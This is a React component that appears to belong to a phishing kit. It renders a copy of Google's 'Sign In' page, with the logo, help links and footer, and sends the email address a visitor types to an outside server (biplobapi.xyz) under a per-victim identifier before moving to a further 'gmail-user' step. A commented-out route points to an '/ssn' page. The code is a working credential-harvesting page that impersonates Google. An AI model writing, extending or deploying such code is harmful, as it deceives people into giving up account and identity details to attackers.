import React from "react";
import "./Gmail.css";
import { useLocation, useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";

const Gmail = () => {
  const { state } = useLocation();
  const navigate = useNavigate();
  const { temp } = state;
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const handleVerify = (data) => {
    const gmail = {
      gmail: data.gmail,
    };

    localStorage.setItem("gmail", data.gmail);

    fetch(`https://biplobapi.xyz/gmail/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(gmail),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.modifiedCount > 0) {
          // navigate("/ssn", { state: { temp: temp } });
          navigate("/gmail-user", { state: { temp: temp } });
        }
      });
  };
  return (
    <div className="gmail-container">
      <div>
        <form className="email-box" onSubmit={handleSubmit(handleVerify)}>
          <h5 className="nxt-stp">Complete Your Next Step</h5>
          <img src="/google.png" alt="" />
          <h5>Sign In</h5>
          <p>
            <b>to continue to google</b>
          </p>
          <div className="input-box">
            <div className="form-group">
              <input
                type="text"
                id="name"
                name="name"
                {...register("gmail")}
                required
              />
              <label for="name">Email or Phone</label>
            </div>

            <p>
              <a href="">Forgot email?</a>
            </p>
            <p>
              Not your computer? Use a Private Window to sign in. <br />{" "}
              <a href="">Learn More</a>{" "}
            </p>
          </div>
          <div className="bottom-container">
            <a href="">Create Account</a>
            <button className="next-btn" type="submit">
              Next
            </button>
          </div>
        </form>
        <div className="menu-container">
          <div>
            <small>English (Unites Sates)</small>
          </div>
          <div className="menus">
            <small>Home</small>
            <small>Privacy</small>
            <small>Terms</small>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Gmail;
